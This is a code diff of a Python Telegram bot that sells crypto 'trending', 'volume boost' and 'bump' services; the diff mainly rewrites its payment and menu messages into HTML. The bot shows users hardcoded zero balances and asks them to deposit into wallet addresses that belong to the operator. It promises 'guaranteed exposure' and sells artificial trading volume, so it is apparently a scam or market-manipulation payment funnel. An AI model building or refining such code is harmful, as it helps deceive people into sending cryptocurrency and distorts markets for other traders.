@@ -46,7 +46,12 @@ def is_valid_tx_hash(tx_hash):
 
 def send_tx_hash_prompt(chat_id, price):
     """Send tx hash input prompt with cancel button"""
-    text = f"You selected this {price}\n\nPlease send your tx hash below and await immediate confirmation\n\n⏰ You have 15 minutes to submit your transaction hash."
+    text = (
+        f"🧾 Order Details\n\n"
+        f"You selected: <b>{html_escape(str(price))}</b>\n\n"
+        f"Please send your <b>transaction hash</b> below for verification.\n\n"
+        f"⏰ <b>Time Limit:</b> You have 15 minutes to submit your transaction hash."
+    )
 
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
@@ -78,7 +83,7 @@ def start_tx_timeout(chat_id):
                 tx_hash_waiting.pop(chat_id, None)
                 markup = InlineKeyboardMarkup(row_width=1)
                 markup.add(InlineKeyboardButton("🔝 Main Menu", callback_data="mainmenu"))
-                bot.send_message(chat_id, "⏰ Timeout: You didn't submit a transaction hash within 15 minutes. Your order has been cancelled.", reply_markup=markup)
+                bot.send_message(chat_id, "⏰ <b>Timeout</b>\nYou didn’t submit a transaction hash within 15 minutes. Your order has been cancelled.", reply_markup=markup)
 
     thread = threading.Thread(target=timeout_check)
     thread.daemon = True
@@ -115,11 +120,11 @@ def handle_tx_callback(call):
             except:
                 pass
         else:
-            bot.answer_callback_query(call.id, "❌ No active transaction waiting. Please start a new order.")
+            bot.answer_callback_query(call.id, "❌ No active transaction is waiting. Please start a new order.")
 
 def send_eth_payment_instructions(chat_id, price, token_name=None):
     """Send ETH trending payment instructions with multiple wallet options"""
-    verify_text = "\n\nClick /sent to verify payment"
+    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
 
     # Define wallet addresses for different price tiers
     eth_wallets = {
@@ -131,37 +136,34 @@ def send_eth_payment_instructions(chat_id, price, token_name=None):
     wallet_address = eth_wallets.get(price, ETH_WALLET_100)
     wallet_address_md = code_wrap(wallet_address)
     text = (
-        f"🔵ETH TREND\n"
-        f"Kindly chose the trend you wish to pump on.\n\n"
-        f"✅Token Successfully added✅\n\n"
-        f"🟢One last Step: Payment Required.\n\n"
-        f"Price: {price}\n"
-        f"Wallet:\n\n"
-        f"{wallet_address_md}\n\n"
-        f"📝 Note:\n"
-        f"Kindly make sure to send the exact price and no additional price should be add.{verify_text}"
+        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
+        f"Your selection has been added successfully.\n\n"
+        f"💳 <b>Payment Details</b>\n"
+        f"Price: <b>{html_escape(str(price))}</b>\n"
+        f"Wallet:\n{wallet_address_md}\n\n"
+        f"📝 Please send the exact amount. {verify_text}"
     )
     bot.send_message(chat_id, text)
 
 def send_pumpfun_payment_instructions(chat_id, price, token_name=None):
     """Send PumpFun trending payment instructions"""
-    verify_text = "\n\nClick /sent to verify payment"
+    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
 
     pumpfun_address = PUMPFUN_WALLET
     pumpfun_address_md = code_wrap(pumpfun_address)
     text = (
-        f"Order Placed Successfully!\n"
-        f"✅ We have 1 available slot!✅\n\n"
-        f"Once the payment received you will get notification and trending will start in 20 mins.\n\n\n"
-        f"Payment address:SOL\n"
-        f"{pumpfun_address_md}\n"
-        f" (Tap to Copy){verify_text}"
+        f"✅ <b>Order Placed Successfully</b>\n\n"
+        f"We currently have an available slot.\n"
+        f"Once payment is received, your trending will begin within <b>20 minutes</b>.\n\n"
+        f"<b>Network:</b> SOL\n"
+        f"<b>Payment Address</b>\n{pumpfun_address_md}\n"
+        f"(Tap to copy){verify_text}"
     )
     bot.send_message(chat_id, text)
 
 def send_volume_payment_instructions(chat_id, price, token_name=None):
     """Send volume boost payment instructions"""
-    verify_text = "\n\nClick /sent to verify payment"
+    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
 
     # Get package details based on price
     package_details = {
@@ -179,24 +181,23 @@ def send_volume_payment_instructions(chat_id, price, token_name=None):
     wallet_address_md = code_wrap(wallet_address)
 
     text = (
-        f"🚀 **Volume Boost Order Confirmed!**\n\n"
-        f"✅ **{package['name']}** Successfully Added ✅\n\n"
-        f"📊 **Package Details:**\n"
-        f"• Package: {package['name']}\n"
-        f"• Volume: {package['volume']}\n"
-        f"• Price: {price} SOL\n\n"
-        f"🟢 **One Last Step: Payment Required**\n\n"
-        f"⌛️ Please complete the one-time fee payment of **{price} SOL** to the following wallet address:\n\n"
-        f"<b>Wallet:</b>\n"
-        f"{wallet_address_md}\n\n"
-        f"Once you have completed the payment within the given timeframe, your volume boost will be activated!{verify_text}"
+        f"🚀 <b>Volume Boost Confirmed</b>\n\n"
+        f"✅ <b>{html_escape(package['name'])}</b> has been added to your order.\n\n"
+        f"📊 <b>Package Details</b>\n"
+        f"• Package: {html_escape(package['name'])}\n"
+        f"• Estimated Volume: {html_escape(package['volume'])}\n"
+        f"• Price: <b>{html_escape(str(price))} SOL</b>\n\n"
+        f"🟢 <b>Final Step: Payment</b>\n\n"
+        f"Please complete a one-time payment of <b>{html_escape(str(price))} SOL</b> to the wallet below:\n\n"
+        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
+        f"Once payment is confirmed, your volume boost will be activated.{verify_text}"
     )
 
     bot.send_message(chat_id, text)
 
 def send_eth_trending_payment_instructions(chat_id, price, token_name=None):
     """Send ETH trending payment instructions"""
-    verify_text = "\n\nClick /sent to verify payment"
+    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
 
     # Get package details based on price
     package_details = {
@@ -219,17 +220,16 @@ def send_eth_trending_payment_instructions(chat_id, price, token_name=None):
     wallet_address_md = code_wrap(wallet_address)
 
     text = (
-        f"🔵 **ETH Trending Order Confirmed!**\n\n"
-        f"✅ **{package['name']}** Successfully Added ✅\n\n"
-        f"📊 **Package Details:**\n"
-        f"• Package: {package['name']}\n"
-        f"• Duration: {package['duration']}\n"
-        f"• Price: {price}\n\n"
-        f"🟢 **One Last Step: Payment Required**\n\n"
-        f"⌛️ Please complete the one-time fee payment of **{price}** to the following wallet address:\n\n"
-        f"<b>Wallet:</b>\n"
-        f"{wallet_address_md}\n\n"
-        f"Once you have completed the payment within the given timeframe, your ETH trending will be activated!{verify_text}"
+        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
+        f"✅ <b>{html_escape(package['name'])}</b> has been added.\n\n"
+        f"📊 <b>Package Details</b>\n"
+        f"• Package: {html_escape(package['name'])}\n"
+        f"• Duration: {html_escape(package['duration'])}\n"
+        f"• Price: <b>{html_escape(str(price))}</b>\n\n"
+        f"🟢 <b>Final Step: Payment</b>\n\n"
+        f"Please complete payment of <b>{html_escape(str(price))}</b> to the wallet below:\n\n"
+        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
+        f"Once payment is received, your ETH trending will be activated.{verify_text}"
     )
 
     bot.send_message(chat_id, text)
@@ -252,11 +252,23 @@ def send_payment_instructions(chat_id, price, token_name=None):
 
     wallet_address = SOL_WALLET
     wallet_address_md = code_wrap(wallet_address)
-    verify_text = "\n\nClick /sent to verify payment"
+    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."
     if token_name:
-        text = f"✅{token_name} Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {html_escape(price)} to the following wallet address: \n\nWallet:\n{wallet_address_md}\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
+        text = (
+            f"✅ <b>{html_escape(token_name)}</b> has been added.\n\n"
+            f"🟢 <b>Final Step: Payment</b>\n\n"
+            f"Please complete a one-time payment of <b>{html_escape(str(price))}</b> to the wallet below:\n\n"
+            f"<b>Wallet</b>\n{wallet_address_md}\n\n"
+            f"Once payment is confirmed, your bump order will be activated.{verify_text}"
+        )
     else:
-        text = f"✅Token Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {html_escape(price)} SOL to the following wallet address: \n\nWallet:\n{wallet_address_md}\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
+        text = (
+            f"✅ <b>Token Added</b>\n\n"
+            f"🟢 <b>Final Step: Payment</b>\n\n"
+            f"Please complete a one-time payment of <b>{html_escape(str(price))} SOL</b> to the wallet below:\n\n"
+            f"<b>Wallet</b>\n{wallet_address_md}\n\n"
+            f"Once payment is confirmed, your bump order will be activated.{verify_text}"
+        )
     price_to_image = {
         '0.3': 'https://github.com/raccityy/raccityy.github.io/blob/main/3.jpg?raw=true',
         '0.4': 'https://github.com/raccityy/raccityy.github.io/blob/main/4.jpg?raw=true',
@@ -516,10 +528,9 @@ def handle_callbacks(call):
         elif call.data == "deposit_withdraw":
             bot.answer_callback_query(call.id)
             text = (
-                "⚠️Current wallet is insufficient\n\n"
-                "your current balance is 0.0 SOL\n\n"
-                "Please deposit at least 0.20 SOL to your wallet\n"
-                "let's get your project trending top Notch"
+                "⚠️ <b>Insufficient Balance</b>\n\n"
+                "Your current balance is <b>0.0 SOL</b>.\n\n"
+                "Please deposit at least <b>0.20 SOL</b> to continue and get your project trending."
             )
             bot.send_message(call.message.chat.id, text)
         elif call.data == "deposit_balance":
@@ -527,14 +538,14 @@ def handle_callbacks(call):
             eth_address = code_wrap(ETH_WALLET_100)
             sol_address = code_wrap(SOL_WALLET)
             text = (
-                "WALLET BALANCE\n\n"
-                "ETH: \n"
+                "💼 <b>Wallet Balances</b>\n\n"
+                "ETH:\n"
                 f"{eth_address}\n"
-                f"balance: {code_wrap('0.0 ETH')}\n\n"
-                "SOL: \n"
+                f"Balance: {code_wrap('0.0 ETH')}\n\n"
+                "SOL:\n"
                 f"{sol_address}\n"
-                f"balance: {code_wrap('0.0 SOL')}\n\n"
-                "Deposit not less than 0.20 SOL and get trending on several plaforms "
+                f"Balance: {code_wrap('0.0 SOL')}\n\n"
+                "Tip: Deposit at least <b>0.20 SOL</b> to get trending on several platforms."
             )
             bot.send_message(call.message.chat.id, text)
         elif call.data == "deposit_back":
@@ -647,7 +658,7 @@ def handle_contract_address_or_tx(message):
             ca = waiting_data['ca']
             user = message.from_user.username or message.from_user.id
             send_payment_verification_to_group(user, price, ca, tx_hash, user_chat_id=chat_id)
-            bot.send_message(chat_id, "✅ Your tx hash has been sent for verification. Please wait for confirmation.")
+            bot.send_message(chat_id, "✅ <b>Thank you!</b> Your transaction hash was sent for verification. Please wait for confirmation.")
             tx_hash_waiting.pop(chat_id, None)
         else:
             # Invalid tx hash - show retry options
@@ -656,7 +667,7 @@ def handle_contract_address_or_tx(message):
                 InlineKeyboardButton("🔄 Retry", callback_data="tx_retry"),
                 InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel")
             )
-            bot.send_message(chat_id, "❌ Invalid tx hash. Please send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
+            bot.send_message(chat_id, "❌ <b>Invalid Transaction Hash</b>\nPlease send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
         return
 
     # Handle CA input with new handler
@@ -686,10 +697,10 @@ def handle_contract_address_or_tx(message):
             # Call SOL trending directly
             chat_id = message.chat.id
             text = (
-                "🟢Discover the Power of Trending!\n\n"
-                "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
-                "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
-                "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
+                "📈 <b>Boost Your Visibility</b>\n\n"
+                "Trending delivers guaranteed exposure, milestone highlights, and real-time momentum updates to amplify your project.\n\n"
+                "🎙️ A paid boost also guarantees you a spot in our daily livestream (AMA).\n\n"
+                "Please choose an option below to get started:\n"
                 "_____________________"
             )
             markup = InlineKeyboardMarkup(row_width=2)
